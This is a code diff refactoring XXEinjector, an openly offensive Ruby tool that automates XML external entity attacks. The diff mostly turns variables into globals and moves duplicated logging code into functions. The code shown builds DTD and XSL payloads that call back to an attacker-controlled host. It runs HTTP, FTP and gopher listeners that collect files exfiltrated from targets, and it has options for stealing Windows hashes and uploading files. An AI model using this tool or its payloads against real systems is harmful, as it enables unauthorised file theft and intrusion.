@@ -10,11 +10,11 @@ require 'readline'
 
 # CONFIGURE
 host = "" # our external ip
-path = "" # path to enumerate
+$path = "" # path to enumerate
 $file = "" # file with vulnerable HTTP request
 $secfile = "" # file with second request (2nd order)
 enum = "ftp" # which out of band protocol should be used for file retrieval - ftp/http/gopher
-logger = "n" # only log requests, do not send anything
+$logger = "n" # only log requests, do not send anything
 
 $proto = "http" # protocol to use - http/https
 $proxy = "" # proxy host
@@ -24,7 +24,7 @@ enumports = "" # which ports should be checked if they are unfiltered for revers
 phpfilter = "n" # if yes php filter will be used to base64 encode file content - y/n
 $urlencode = "n" # if injected DTD should be URL encoded
 enumall = "n" # if yes XXEinjector will not ask what to enum (prone to false positives) - y/n
-brute = "" # file with paths to bruteforce
+$brute = "" # file with paths to bruteforce
 $direct = "" # if direct exploitation should be used, this parameter should contain unique mark between which results are returned
 
 hashes = "n" # steal Windows hashes
@@ -35,7 +35,7 @@ $xslt = "n" # tests for XSLT
 $test = false # test mode, shows only payload
 $dtdi = "y" # if yes then DTD is injected automatically
 $rproto = "file" # file or netdoc protocol to retrieve data
-output = "brute.log" # output file for brute and logger modes
+$output = "brute.log" # output file for brute and logger modes
 $verbose = "n" # verbose messaging
 timeout = 10 # timeout for receiving responses
 $contimeout = 30 # timeout used to close connection with server
@@ -49,10 +49,31 @@ gopher_port = 70 # gopher port that receives file contents/directory listings
 jar_port = 1337 # port accepts connections and then sends files
 xslt_port = 1337 # port that is used to test for XSLT injection
 
+# holds HTTP responses
+$response = ""
+# regex to find directory listings
+$regex = /^[$.\-_~ 0-9A-Za-z]+$/
+# array that holds filenames to enumerate
+$filenames = Array.new
+# temp path holders - hold next filenames in different formats for enumeration
+$nextpath = ""
+enumpath = ""
+$tmppath = ""
+$directpath = ""
+# array that contains skipped and allowed paths
+blacklist = Array.new
+whitelist = Array.new
+# other variables
+$method = "post" # HTTP method - get/post
+cmp = "" # holds user input
+switch = 0 # this switch locks enumeration if response is pending
+i = 0 # main counter
+$time = 1 # HTTP response timeout
+
 # set all variables
 ARGV.each do |arg|
 	host = arg.split("=")[1] if arg.include?("--host=")
-	path = arg.split("=")[1] if arg.include?("--path=")
+	$path = arg.split("=")[1] if arg.include?("--path=")
 	$file = arg.split("=")[1] if arg.include?("--file=")
 	enum = arg.split("=")[1] if arg.include?("--oob=")
 	$proto = "https" if arg.include?("--ssl")
@@ -60,7 +81,7 @@ ARGV.each do |arg|
 	$proxy_port = arg.split("=")[1].split(":")[1] if arg.include?("--proxy=")
 	phpfilter = "y" if arg.include?("--phpfilter")
 	enumall = "y" if arg.include?("--fast")
-	brute = arg.split("=")[1] if arg.include?("--brute=")
+	$brute = arg.split("=")[1] if arg.include?("--brute=")
 	$verbose = "y" if arg.include?("--verbose")
 	xslt_port = arg.split("=")[1] if arg.include?("--xsltport=")
 	http_port = arg.split("=")[1] if arg.include?("--httpport=")
@@ -76,9 +97,9 @@ ARGV.each do |arg|
 	$dtdi = "n" if arg.include?("--nodtd")
 	$xslt = "y" if arg.include?("--xslt")
 	$direct = arg.split("=")[1] if arg.include?("--direct=")
-	logger = "y" if arg.include?("--logger")
-	brute = "logger" if arg.include?("--logger")
-	output = arg.split("=")[1] if arg.include?("--output=")
+	$logger = "y" if arg.include?("--logger")
+	$brute = "logger" if arg.include?("--logger")
+	$output = arg.split("=")[1] if arg.include?("--output=")
 	$secfile = arg.split("=")[1] if arg.include?("--2ndfile=")
 	$rproto = "netdoc" if arg.include?("--netdoc")
 	$contimeout = Integer(arg.split("=")[1]) if arg.include?("--contimeout=")
@@ -99,18 +120,16 @@ if ARGV.include? "--dtd"
 	puts "<!DOCTYPE m [ <!ENTITY % remote SYSTEM \"http://#{host}:#{http_port}/file.dtd\">%remote;%int;%trick;]>"
 	puts ""
 	exit(1)
-end
 
 # show sample direct exploitation XML
-if ARGV.include? "--xml"
+elsif ARGV.include? "--xml"
 	puts ""
 	puts "<!DOCTYPE m [ <!ENTITY direct SYSTEM \"XXEINJECT\">]><tag>UNIQUEMARK&direct;UNIQUEMARK</tag>"
 	puts ""
 	exit(1)
-end
 
 # show main menu
-if ARGV.nil? || (ARGV.size < 3 && logger == "n") || (host == "" && $direct == "" && logger == "n") || ($file == "" && logger == "n") || (path == "" && brute == "" && hashes == "n" && upload == "" && expect == "" && enumports == "" && $xslt == "n" && logger == "n")
+elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct == "" && $logger == "n") || ($file == "" && $logger == "n") || ($path == "" && $brute == "" && hashes == "n" && upload == "" && expect == "" && enumports == "" && $xslt == "n" && $logger == "n")
 	puts "XXEinjector by Jakub Pa\u0142aczy\u0144ski"
 	puts ""
 	puts "XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications."
@@ -186,52 +205,6 @@ end
 
 # EXECUTION
 
-# DTD to inject
-$dtd = "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://#{host}:#{http_port}/file.dtd\">%remote;%int;%trick;]>"
-# XSL to inject
-$xsl = "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:variable name=\"cmd\" select=\"document('http://#{host}:#{xslt_port}/success')\"/><xsl:value-of select=\"$cmd\"/></xsl:template></xsl:stylesheet>"
-# holds HTTP responses
-$response = ""
-# regex to find directory listings
-regex = /^[$.\-_~ 0-9A-Za-z]+$/
-# array that holds filenames to enumerate
-filenames = Array.new
-# temp path holders - hold next filenames in different formats for enumeration
-nextpath = ""
-enumpath = ""
-$directpath = ""
-# array that contains skipped and allowed paths
-blacklist = Array.new
-whitelist = Array.new
-# other variables
-$method = "post" # HTTP method - get/post
-cmp = "" # holds user input
-switch = 0 # this switch locks enumeration if response is pending
-i = 0 # main counter
-$time = 1 # HTTP response timeout
-# set longer timeout for direct exploitation
-if $direct != ""
-	$time = 30
-end
-
-# Remove first slash if unix-like path specified
-cut = 0
-if path[0] == "/"
-	path[0] = ''
-	cut = 1
-end
-
-# Remove slash at the end if not Windows drive
-if path[-1] == "/" && path[-2] != ":"
-	path[-1] = ''
-end
-
-# Add some changes to Windows path
-if cut == 0
-	path += '/' if path[-1] == ":"
-	path = path.gsub("\\", "/")
-end
-
 ### Processing Request File ###
 
 # Configure basic options
@@ -243,13 +216,8 @@ if $proxy == ""
 end
 
 # get connection host and port
-if logger == "n"
+if $logger == "n"
 	z = 1
-	if $proto == "http"
-		$port = 80
-	else
-		$port = 443
-	end
 	loop do
 		break if File.readlines($file)[z].chomp.empty?
 		if File.readlines($file)[z].include?("Host: ")
@@ -260,6 +228,13 @@ if logger == "n"
 			end
 		end
 		z = z + 1
+	end
+	if $port == 0
+		if $proto == "http"
+			$port = 80
+		else
+			$port = 443
+		end	
 	end
 end
 
@@ -602,9 +577,117 @@ def send2ndreq()
 	}
 end
 
+# logging to separate file or output file if in bruteforce mode
+def log(param)
+	if $brute == ""
+		logpath = "#{$path}"
+		if $direct == ""
+			if $tmppath != "" && logpath[-1] != "/"
+				logpath += "/"
+			end
+			logpath += "#{$tmppath}"
+		else
+			if $nextpath != "" && logpath[-1] != "/"
+				logpath += "/"
+			end
+			logpath += "#{$nextpath}"
+		end
+		logpath = logpath.gsub('\\','/')
+		logpath[0] = "" if logpath[0] == "/"
+		logpath[-1] = "" if logpath[-1] == "/"
+		if $tmppath != ""
+			FileUtils.mkdir_p "Logs/" + $remote + "/" + logpath.split("/")[0..-2].join('/')
+		else
+			if logpath.include?("/")
+				FileUtils.mkdir_p "Logs/" + $remote + "/" + logpath.split("/")[0..-2].join('/')
+			else
+				FileUtils.mkdir_p "Logs/" + $remote + "/" + logpath
+			end
+		end
+		if  $done == 0
+			if $cut == 1
+				puts "Successfully logged file: /#{logpath}"
+			else
+				if logpath[-1] == ":"
+					puts "Successfully logged file: #{logpath}/"
+				else
+					puts "Successfully logged file: #{logpath}"
+				end
+			end
+			$done = 1
+		end
+		if logpath == ""
+			log = File.open("Logs/" + $remote + "/" + "rootdir.log", "a")
+		else
+			log = File.open("Logs/" + $remote + "/" + "#{logpath}.log", "a")
+		end
+		log.write param
+		log.close
+	else
+		log = File.open($output, "a")
+		log.write param
+		puts "Next results:\n#{param}\n" if $logger == "y" || $verbose == "y"
+		print "> " if $logger == "y"
+		log.close
+	end
+end
+
+# pushing enumerated items to an array
+def pusharr(param)
+	if $brute == ""
+		param = param.chomp
+		if param.match $regex
+			if $direct == ""
+				logp = $tmppath
+				if $tmppath != ""
+					logp += "/"
+				end
+			else
+				logp = $nextpath
+				if $nextpath != ""
+					logp += "/"
+				end
+			end
+			logp += param
+			$filenames.push(logp)
+			puts "Path pushed to array: #{logp}" if $verbose == "y"
+		end
+	end
+end
+
+# initial changes
+# set longer timeout for direct exploitation
+if $direct != ""
+	$time = 30
+end
+
+# Remove first slash if unix-like path specified
+$cut = 0
+if $path[0] == "/"
+	$path[0] = ''
+	$cut = 1
+end
+
+# Remove slash at the end if not Windows drive
+if $path[-1] == "/" && $path[-2] != ":"
+	$path[-1] = ''
+end
+
+# Add some changes to Windows path
+if $cut == 0
+	$path += '/' if $path[-1] == ":"
+	$path = $path.gsub("\\", "/")
+end
+
+# configure payloads
+# DTD to inject
+$dtd = "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://#{host}:#{http_port}/file.dtd\">%remote;%int;%trick;]>"
+# XSL to inject
+$xsl = "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:variable name=\"cmd\" select=\"document('http://#{host}:#{xslt_port}/success')\"/><xsl:value-of select=\"$cmd\"/></xsl:template></xsl:stylesheet>"
+
 # Starting servers
 begin
-	if ($xslt == "n" && enumports == "" && $direct == "" && logger == "n") || (logger == "y" && enum == "http")
+	if ($xslt == "n" && enumports == "" && $direct == "" && $logger == "n") || ($logger == "y" && enum == "http")
 		http = TCPServer.new http_port
 	end
 	if enum == "ftp" && $xslt == "n" && enumports == "" && $direct == ""
@@ -628,8 +711,8 @@ end
 Thread.start do
 loop do
   Thread.start(http.accept) do |client|
-	done = 0
-	tmppath = nextpath
+	$done = 0
+	$tmppath = $nextpath
 	loop {
 
 		params = {}
@@ -642,7 +725,7 @@ loop do
 			puts "Got request for XML:\n#{req}\n" if $verbose == "y"
 
 			if hashes == "n" && upload == "" && expect == ""
-				if cut == 1
+				if $cut == 1
 					puts "Responding with XML for: /#{enumpath}"
 				else
 					puts "Responding with XML for: #{enumpath}"
@@ -729,65 +812,11 @@ loop do
 
 				param = URI.decode(param)
 
-				# log to separate file or output file if in bruteforce mode
-				if brute == ""
-					logpath = "#{path}"
-					if tmppath != "" && logpath[-1] != "/"
-						logpath += "/"
-					end
-					logpath += "#{tmppath}"
-					logpath = logpath.gsub('\\','/')
-					logpath[0] = "" if logpath[0] == "/"
-					logpath[-1] = "" if logpath[-1] == "/"
-					if tmppath != ""
-						FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
-					else
-						if logpath.include?("/")
-							FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
-						else
-							FileUtils.mkdir_p $remote + "/" + logpath
-						end
-					end
-					if  done == 0
-						if cut == 1
-							puts "Successfully logged file: /#{logpath}"
-						else
-							if logpath[-1] == ":"
-								puts "Successfully logged file: #{logpath}/"
-							else
-								puts "Successfully logged file: #{logpath}"
-							end
-						end
-						done = 1
-					end
-					if logpath == ""
-						log = File.open($remote + "/" + "rootdir.log", "a")
-					else
-						log = File.open($remote + "/" + "#{logpath}.log", "a")
-					end
-					log.write param + "\n"
-					log.close
-				else
-					log = File.open(output, "a")
-					log.write param + "\n"
-					puts "Next results:\n#{param}\n" if logger == "y" || $verbose == "y"
-					print "> " if logger == "y"
-					log.close
-				end	
+				# logging to file
+				log(param + "\n")
 
 				# push to array if directory listing is detected for further enumeration
-				if brute == ""
-					param = param.chomp
-					if param.match regex
-						logp = tmppath
-						if tmppath != ""
-							logp += "/"
-						end
-						logp += param
-						filenames.push(logp)
-						puts "Path pushed to array: #{logp}" if $verbose == "y"
-					end
-				end
+				pusharr(param)
 			end
 		end
 		client.close
@@ -801,10 +830,10 @@ if enum == "ftp"
 	Thread.start do
 	loop do
   	  Thread.start(ftp.accept) do |client|
-		done = 0
+		$done = 0
 		switch = 0
 		puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
-		tmppath = nextpath
+		$tmppath = $nextpath
 		client.puts("220 XXEinjector Welcomes!")
 		begin
 		status = Timeout::timeout($contimeout) {
@@ -843,89 +872,17 @@ if enum == "ftp"
 					exit(1)
 				end
 				
-				# log to separate file or output file if in bruteforce mode
-				if brute == ""
-					logpath = ""
-					logpath += "#{path}"
-					if tmppath != "" && logpath[-1] != "/"
-						logpath += "/"
-					end
-					logpath += "#{tmppath}"
-					logpath = logpath.gsub('\\','/')
-					logpath[0] = "" if logpath[0] == "/"
-					logpath[-1] = "" if logpath[-1] == "/"
-					if tmppath != ""
-						FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
-					else
-						if logpath.include?("/")
-							FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
-						else
-							FileUtils.mkdir_p $remote + "/" + logpath
-						end
-					end
-					if  done == 0
-						if cut == 1
-							puts "Successfully logged file: /#{logpath}"
-						else
-							if logpath[-1] == ":"
-								puts "Successfully logged file: #{logpath}/"
-							else
-								puts "Successfully logged file: #{logpath}"
-							end
-						end
-						done = 1
-					end
-					if logpath == ""
-						log = File.open($remote + "/" + "rootdir.log", "a")
-					else
-						log = File.open($remote + "/" + "#{logpath}.log", "a")
-					end
-					log.write req
-					log.close
-				else
-					log = File.open(output, "a")
-					log.write req
-					puts "Next results:\n#{req}\n" if logger == "y" || $verbose == "y"
-					print "> " if logger == "y"
-					log.close
-				end	
+				# logging to file
+				log(req)	
 	
 				# clear requests that are known to be not part of directory listing
 				req = req.chomp
-				if req.match(/^USER /)
-					req = ""
-				end
-				if req.match(/^PASS /)
-					req = ""
-				end
-				if req == "TYPE I"
-					req = ""
-				end
-				if req.include? "EPSV"
-					req = ""
-				end
-				if req == "TYPE A"
-					req = ""
-				end
-				if req == "LIST"
-					req = ""
-				end
-				if req.include?("CWD ")
+				if req.include?("CWD ") || req.match(/^USER /) || req.match(/^PASS /) || req == "TYPE I" || req.include?("EPSV") || req == "TYPE A" || req == "LIST"
 					req = ""
 				end
 	
 				# push to array if directory listing is detected for further enumeration
-				if brute == ""
-					if req.match regex
-						logp = tmppath
-						if tmppath != ""
-							logp += "/"
-						end
-						logp += req
-						filenames.push(logp)
-						puts "Path pushed to array: #{logp}" if $verbose == "y"
-					end
-				end
+				pusharr(req)
 	
 			}
 		}
@@ -942,10 +899,10 @@ if enum == "gopher"
 	Thread.start do
 	loop do
  	  Thread.start(gopher.accept) do |client|
-		done = 0
+		$done = 0
 		switch = 0
 		puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
-		tmppath = nextpath
+		$tmppath = $nextpath
 		begin
 		status = Timeout::timeout($contimeout) {
 			loop {
@@ -959,65 +916,11 @@ if enum == "gopher"
 				req.sub! 'gopher=', ''
 				req.split("\n").each do |param|
 	
-					# log to separate file or output file if in bruteforce mode
-					if brute == ""
-						logpath = ""
-						logpath += "#{path}"
-						if tmppath != "" && logpath[-1] != "/"
-							logpath += "/"
-						end
-						logpath += "#{tmppath}"
-						logpath = logpath.gsub('\\','/')
-						logpath[0] = "" if logpath[0] == "/"
-						logpath[-1] = "" if logpath[-1] == "/"
-						if tmppath != ""
-							FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
-						else
-							if logpath.include?("/")
-								FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
-							else
-								FileUtils.mkdir_p $remote + "/" + logpath
-							end
-						end
-						if  done == 0
-							if cut == 1
-								puts "Successfully logged file: /#{logpath}"
-							else
-								if logpath[-1] == ":"
-									puts "Successfully logged file: #{logpath}/"
-								else
-									puts "Successfully logged file: #{logpath}"
-								end
-							end
-							done = 1
-						end
-						if logpath == ""
-							log = File.open($remote + "/" + "rootdir.log", "a")
-						else
-							log = File.open($remote + "/" + "#{logpath}.log", "a")
-						end
-						log.write param + "\n"
-						log.close
-					else
-						log = File.open(output, "a")
-						log.write param + "\n"
-						puts "Next results:\n#{param}\n" if logger == "y" || $verbose == "y"
-						print "> " if logger == "y"
-						log.close
-					end
+					# logging to file
+					log(param + "\n")
 			
 					# push to array if directory listing is detected for further enumeration
-					if brute == ""
-						if param.match regex
-							logp = tmppath
-							if tmppath != ""
-								logp += "/"
-							end
-							logp += param
-							filenames.push(logp)
-							puts "Path pushed to array: #{logp}" if $verbose == "y"
-						end
-					end
+					pusharr(param)
 				end
 	
 			}
@@ -1031,7 +934,7 @@ if enum == "gopher"
 end
 
 # logger
-if logger == "y"
+if $logger == "y"
 	puts "You can now make requests."
 	puts "Enter \"exit\" to quit."
 	loop do
@@ -1112,7 +1015,7 @@ if upload != ""
   	  Thread.start(jar.accept) do |client|
 		content = IO.binread(upload)
 		count = 0
-		puts "File uploaded. Check temp directory on remote host for jar_cache*.tmp file. This file is available until connection is closed (CTRL+C)."
+		puts "File uploaded. Check temp directory on remote host for jar_cache*.tmp file. This file is available until connection is closed."
 		loop do
 			if count == 0
 				client.puts(content)
@@ -1161,16 +1064,16 @@ if hashes == "y"
 end
 
 # Sending first request
-if brute == ""
+if $brute == ""
 	if $direct == ""
-		enumpath = path
+		enumpath = $path
 		switch = 1
 		puts "Enumeration locked." if $verbose == "y"
 		sendreq()
 		send2ndreq() if $secfile != ""
 	else
-		done = 0
-		$directpath = path
+		$done = 0
+		$directpath = $path
 		configreq()
 		sendreq()
 		send2ndreq() if $secfile != ""
@@ -1185,37 +1088,12 @@ if brute == ""
 				$response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n").split("\n").each do |param|				
 					
 					# log to separate file
-					logpath = "#{path}"
-					logpath = logpath.gsub('\\','/')
-					if logpath.include?("/")
-						FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
-					else
-						FileUtils.mkdir_p $remote + "/" + logpath
-					end
-					if  done == 0
-						if cut == 1
-							puts "Successfully logged file: /#{logpath}"
-						else
-							if logpath[-1] == ":"
-								puts "Successfully logged file: #{logpath}/"
-							else
-								puts "Successfully logged file: #{logpath}"
-							end
-						end
-						done = 1
-					end
-					if logpath == ""
-						log = File.open($remote + "/" + "rootdir.log", "a")
-					else
-						log = File.open($remote + "/" + "#{logpath}.log", "a")
-					end
-					log.write param + "\n"
-					log.close
+					log(param + "\n")
 					
 					# push to array if directory listing is detected for further enumeration
 					param = param.chomp
-					if param.match regex
-						filenames.push(param)
+					if param.match $regex
+						$filenames.push(param)
 						puts "Path pushed to array: #{param}" if $verbose == "y"
 					end
 
@@ -1243,38 +1121,38 @@ end
 
 # read, ask and further enumerate
 loop do
-	if brute == ""
-		if !filenames[i].nil?
+	if $brute == ""
+		if !$filenames[i].nil?
 		
 			# Read next line
-			line = filenames[i]
+			line = $filenames[i]
 			line = line.chomp
 			line = line.gsub(' ','%20')
 		
 			# Check if a file should be enumerated
-			check = "#{path}/#{line}".split("/")[0..-2].join('/')
+			check = "#{$path}/#{line}".split("/")[0..-2].join('/')
 
 			if enumall != "y" && !blacklist.include?(check) && !whitelist.include?(check)
-				if cut == 0
-					if path[-1] == "/"
-						puts "Enumerate #{path}#{line} ? Y[yes]/n[no]/s[skip all files in this directory]/a[enum all files in this directory]"
+				if $cut == 0
+					if $path[-1] == "/"
+						puts "Enumerate #{$path}#{line} ? Y[yes]/n[no]/s[skip all files in this directory]/a[enum all files in this directory]"
 					else
-						puts "Enumerate #{path}/#{line} ? Y[yes]/n[no]/s[skip all files in this directory]/a[enum all files in this directory]"
+						puts "Enumerate #{$path}/#{line} ? Y[yes]/n[no]/s[skip all files in this directory]/a[enum all files in this directory]"
 					end
 				else
-					if path == ""
+					if $path == ""
 						puts "Enumerate /#{line} ? Y[yes]/n[no]/s[skip all files in this directory]/a[enum all files in this directory]"
 					else
-						puts "Enumerate /#{path}/#{line} ? Y[yes]/n[no]/s[skip all files in this directory]/a[enum all files in this directory]"
+						puts "Enumerate /#{$path}/#{line} ? Y[yes]/n[no]/s[skip all files in this directory]/a[enum all files in this directory]"
 					end
 				end
 				cmp = Readline.readline("> ", true)
 				Readline::HISTORY.push
 				if cmp == "s" || cmp == "S"
-					blacklist.push("#{path}/#{line}".split("/")[0..-2].join('/'))
+					blacklist.push("#{$path}/#{line}".split("/")[0..-2].join('/'))
 				end
 				if cmp == "a" || cmp == "A"
-					whitelist.push("#{path}/#{line}".split("/")[0..-2].join('/'))
+					whitelist.push("#{$path}/#{line}".split("/")[0..-2].join('/'))
 					cmp = "y"
 				end
 			elsif	enumall == "y" || whitelist.include?(check)
@@ -1287,21 +1165,21 @@ loop do
 					switch = 1
 					puts "Enumeration locked." if $verbose == "y"
 				end
-				nextpath = "#{line}"
+				$nextpath = "#{line}"
 	
 				# Send request with next filename
 				if $direct != ""
-					if path[-1] != "/"
-						$directpath = "#{path}/#{line}"
+					if $path[-1] != "/"
+						$directpath = "#{$path}/#{line}"
 					else
-						$directpath = "#{path}#{line}"
+						$directpath = "#{$path}#{line}"
 					end
 					configreq()
 				else
-					if path[-1] != "/"
-						enumpath = "#{path}/#{line}"
+					if $path[-1] != "/"
+						enumpath = "#{$path}/#{line}"
 					else
-						enumpath = "#{path}#{line}"
+						enumpath = "#{$path}#{line}"
 					end
 				end
 				enumpath[0] = "" if enumpath[0] == "/"
@@ -1329,54 +1207,14 @@ loop do
 						if $response.body.include?("#{$direct}#{$direct}")
 							puts "File/directory could not be retrieved."
 						else
-							done = 0
+							$done = 0
 							$response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n").split("\n").each do |param|				
 
 								# log to separate file
-								logpath = "#{path}"
-								if nextpath != "" && logpath[-1] != "/"
-									logpath += "/"
-								end
-								logpath += "#{nextpath}"
-								logpath = logpath.gsub('\\','/')
-								logpath[0] = "" if logpath[0] == "/"
-
-								if logpath.include?("/")
-									FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
-								else
-									FileUtils.mkdir_p $remote + "/" + logpath
-								end
-								if  done == 0
-									if cut == 1
-										puts "Successfully logged file: /#{logpath}"
-									else
-										if logpath[-1] == ":"
-											puts "Successfully logged file: #{logpath}/"
-										else
-											puts "Successfully logged file: #{logpath}"
-										end
-									end
-									done = 1
-								end
-								if logpath == ""
-									log = File.open($remote + "/" + "rootdir.log", "a")
-								else
-									log = File.open($remote + "/" + "#{logpath}.log", "a")
-								end
-								log.write param + "\n"
-								log.close
+								log(param + "\n")
 					
 								# push to array if directory listing is detected for further enumeration
-								param = param.chomp
-								if param.match regex
-									logp = nextpath
-									if nextpath != ""
-										logp += "/"
-									end
-									logp += param
-									filenames.push(logp)
-									puts "Path pushed to array: #{logp}" if $verbose == "y"
-								end
+								pusharr(param)
 
 							end
 						end
@@ -1390,14 +1228,14 @@ loop do
 			exit(1)
 		end
 	else
-		brutefile = File.open(brute, "r")
+		brutefile = File.open($brute, "r")
 		exit(1) if IO.readlines(brutefile)[i].nil?
 		
 		# Read next line
 		line = IO.readlines(brutefile)[i]
 		line = line.chomp
 
-		log = File.open(output, "a")
+		log = File.open($output, "a")
 		log.write "\n"
 		log.write "Filename: #{line}\n"
 		log.close
@@ -1405,7 +1243,7 @@ loop do
 		# handle unix and windows paths
 		if line[0] == "/"
 			line[0] = ''
-			cut = 1
+			$cut = 1
 		end
 		line = line.gsub("\\","/")
 		if line[-1] == "/" && line[-2] != ":"
@@ -1431,7 +1269,7 @@ loop do
 			if not $response.body.include?("#{$direct}")
 				puts "Response does not contain unique mark." if $verbose == "y"
 			else
-				log = File.open(output, "a")
+				log = File.open($output, "a")
 				log.write $response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n") + "\n"
 				puts "Bruteforced request logged: #{$directpath}" if $verbose == "y"
 				log.close
